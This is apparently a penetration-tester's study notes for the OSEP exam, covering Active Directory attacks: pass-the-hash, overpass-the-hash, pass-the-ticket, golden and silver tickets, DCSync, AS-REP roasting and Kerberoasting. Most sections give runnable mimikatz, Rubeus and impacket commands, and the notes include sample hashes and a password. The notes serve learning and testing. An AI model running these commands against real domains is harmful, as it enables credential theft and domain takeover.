(Although the techniques explained here aren't teached in the OSEP, I found them pretty useful during my OSEP exam & labs, learning and researching
about them also helped me improve my knowlegde of Active Directory which is always useful)

**PASS THE HASH:**

The pass-the-hash techinque allows an attacker to authenticate to remote systems using the user NTLM hash(the static part, also known as NT hash). 
Note that the pass-the-hash technique only applies to Windows/NTLM authentication and not to Kerberos authentication.

There are lots of tools that support pass-the-hash. For example all the impacket suite supports it, xfreerdp also does, mimikatz also does, and the
list keeps going on...

Passing the hash from bare bones *nix systems using [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/tree/master).

**OVERPASS THE HASH:**

Overpass the hash, presented in the [blackhat](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf). This technique allows an attacker to get a TGT using only the NTLM hash of the user. 

We can for example use overpass the hash through [mimikatz](https://github.com/gentilkiwi/mimikatz):

```
1. C:\> .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

2. mimikatz # sekurlsa::pth /user:user1 /domain:contoso.com /ntlm:<ntlm_hash> /run:PowerShell.exe
```

Once we have the new powershell session, we can authenticate to any AD resource to obtain a TGT, here's an example:

```
PS C:\> klist  -> no TGT for the user1

PS C:\> net use \\dc01.contoso.com

PS C:\> klist -> TGT for the user1
```

Alternatively, you can use this tools from Linux to get a TGT in a .ccache file:

```
~# impacket-getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

~# impacket-getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

~# impacket-python getTGT.py <domain_name>/<user_name>:[password]
```

**PASS THE TICKET:**

The pass-the-ticket technique abuses the TGS, which can be exported and injected somewhere else.

```
Listing tickets:

mimikatz # kerberos::list

C:\> .\Rubeus.exe dump

Exporting all tickets(TGTs and TGSs):

mimikatz # sekurlsa::tickets /export   

C:\> [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>")) -> from base64 to .kirbi

Injecting some ticket into memory:

mimikatz # kerberos::ptt 'C:\ticket.kirbi'

C:\> .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

*When trying to export a usable TGT for our current user, this requieres elevation in the system*

However with the "tgtdeleg" Rubeus function we can aviod the elevation and obtain a fully working TGT for our current user:

```
C:\> Rubeus.exe tgtdeleg
```

Although TGTs on Windows are exported as .kirbi, and on Linux as .ccache. We can use the impacket [ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) to convert a .kirbi to a .ccache, or a .ccache to a .kirbi.

```
From .ccache to .kirbi
~# python ticket_converter.py trike.ccache trike.kirbi

From .kirbi to .ccache
~# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
```

Alternatively you can use this metasploit module [auxiliary/admin/kerberos/ticket_converter](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html).

**GOLDEN TICKETS:**

With golden tickets, we can create TGTs for any domain resource that we want, and stating the groups we want. However to execute this attack we need the "krbtgt" domain account NTLM hash/password. Note that this attack is mostly used when you are already Domain Admin rather than trying to become one.

Now, armed with the "krbtgt" NTLM hash, we can proceed and craft our golden ticket with mimikatz:

```
mimikatz # kerberos::purge

mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:<our_sid_without_the_rid_part> /krbtgt:<ntlm_hash_of_krbtgt> /ptt
(mimikatz by default will assing us the RID of 500, however we can set a custom one via the "/id" parameter)

mimikatz # misc::cmd -> launcing a new cmd with our new TGT
```

As an alternative we can create golden tickets from Linux using [impacket-ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

```
~# impacket-ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

~# impacket-ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
```
**SILVER TICKETS:**

This technique consists of crafting a TGS with the password hash of the SPN. The interesting part about this TGS, is that we can modify our permissions(such as user id or group id) stating that we are local administrator/domain admin/etc on the server where the SPN we have compromised is running its service. 

In our example, our compromimsed SPN will we "svc_mssql", its NTLM password hash will be this "1BF1DE6AEDB12AE1E548210EDBF3511E", its FQDN will be "MSSQL/server.contoso.com" and the SID of the trike user will be "S-1-5-21-2602875597-2787548311-2599479668-1204"

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:S-1-5-21-2602875597-2787548311-2599479668 /target:server.contoso.com /service:MSSQL /rc4:1BF1DE6AEDB12AE1E548210EDBF3511E /ptt
```
(note that in the sid parameter we didn't specify the RID of the trike user, since mimikatz will automatically set our RID to 500 which equals to both local administrator and domain admin)

Alternatively we can use impacket-ticketer from Linux to create silver tickets:

```
~# impacket-ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

~# impacket-ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
```

**DOMAIN CONTROLLER SYNCHRONIZATION:**

This is an alternative way to get any domain user hash without dumping the entire NTDS.dit database. For this reason DcSync is way stealthier. 

This attack works because the domain controller recieving the request doesn't verify that the request came from a know domain controller, only that the SID has the appropiate permissions to do so. For this reason, if a domain admin sends a request to a domain controller, this will likely succeed. 

We can perform this attack with mimikatz:

```
mimikatz # lsadump::dcsync /user:Administrator

mimikatz # lsadump::dcsync /user:krbtgt
```

**AS-REP ROASTING ATTACK:**

This attack works for domain users that have the "DONT_REQ_PREAUTH" property *useraccountcontrol* set. 
```
# From Rubeus
C:\> .\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>

# Check ASREPRoast for all domain users (credentials required)
~# impacket-GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]>

# Check ASREPRoast for a list of users (no credentials required)
~# impacket-GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]>

# Now we will attempt to crack the hashes obtained
~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**KERBEROASTING ATTACK:**

The essence of this attack is to crack the encrypted key which was used to generate the TGS from where we extract the encrypted key to crack.

You need valid domain credentials to perform this attack.

```
~# impacket-getuserspns -request contoso.com/trike:'DevT$st34'@192.168.1.1

msf > use auxiliary/gather/get_user_spns
```
For Windows exploitation(manual and automatic) review this link: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
